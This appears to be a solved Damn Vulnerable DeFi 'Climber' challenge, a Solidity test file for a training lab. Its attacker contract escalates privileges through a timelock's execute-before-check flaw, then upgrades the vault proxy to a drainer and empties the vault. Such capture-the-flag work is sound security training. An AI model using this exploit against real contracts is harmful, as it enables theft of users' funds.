// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberAttacker attacker = new ClimberAttacker(timelock, vault, token, recovery);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

// New vault implementation: a valid UUPS implementation with an unrestricted drain.
// Run through the vault's own context by upgradeToAndCall.
contract ClimberDrainer is UUPSUpgradeable {
    function drain(address token, address to) external {
        DamnValuableToken t = DamnValuableToken(token);
        t.transfer(to, t.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

contract ClimberAttacker {
    bytes32 private constant SALT = bytes32("climber");

    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;
    DamnValuableToken public immutable token;
    address public immutable recovery;

    // The batch is stored so that scheduleSelf() can schedule the exact same operation id
    address[] private targets;
    uint256[] private values;
    bytes[] private data;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // The batch runs with the timelock's own admin rights.
        address[] memory _targets = new address[](4);
        uint256[] memory _values = new uint256[](4);
        bytes[] memory _data = new bytes[](4);

        // 1. Delay -> 0, so a scheduled operation is ready immediately
        _targets[0] = address(timelock);
        _data[0] = abi.encodeCall(timelock.updateDelay, (0));

        // 2. Make this contract a proposer (the timelock is an admin of its own roles)
        _targets[1] = address(timelock);
        _data[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));

        // 3. The timelock owns the vault; hand ownership to this contract
        _targets[2] = address(vault);
        _data[2] = abi.encodeCall(vault.transferOwnership, (address(this)));

        // 4. Call back and schedule this very batch, so the post-execution state check passes
        _targets[3] = address(this);
        _data[3] = abi.encodeCall(this.scheduleSelf, ());

        targets = _targets;
        values = _values;
        data = _data;

        timelock.execute(_targets, _values, _data, SALT);

        // We now own the vault: upgrade it to the drainer and run drain() in its context
        address drainer = address(new ClimberDrainer());
        vault.upgradeToAndCall(drainer, abi.encodeCall(ClimberDrainer.drain, (address(token), recovery)));
    }

    function scheduleSelf() external {
        timelock.schedule(targets, values, data, SALT);
    }
}
